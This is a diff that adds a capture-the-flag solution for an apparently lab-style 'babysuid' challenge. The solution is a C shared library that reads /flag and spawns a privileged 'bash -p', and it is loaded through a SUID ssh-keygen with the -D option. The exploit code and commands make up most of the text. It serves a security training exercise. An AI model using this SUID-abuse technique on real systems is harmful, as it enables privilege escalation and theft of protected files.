@@ -14,4 +14,15 @@ this challenge container to make sure that I set the SUID bit on /usr/bin/ssh-ke
 
 //SOLUZIONE
 
+hacker@babysuid_level51:~$ nano my_script.c
+#include<stdio.h>
+#include<stdlib.h>
 
+static void inject() __attribute__((constructor));
+void C_GetFunctionList(){
+   sendfile(1,open("/flag",0),0,4096);
+   char *argvv[]={"bash","-p",NULL};
+   execvp("/bin/bash",argvv);
+}
+hacker@babysuid_level51:~$ gcc my_script.c -shared -o su.os
+hacker@babysuid_level51:~$ ssh-keygen -D ./su.os
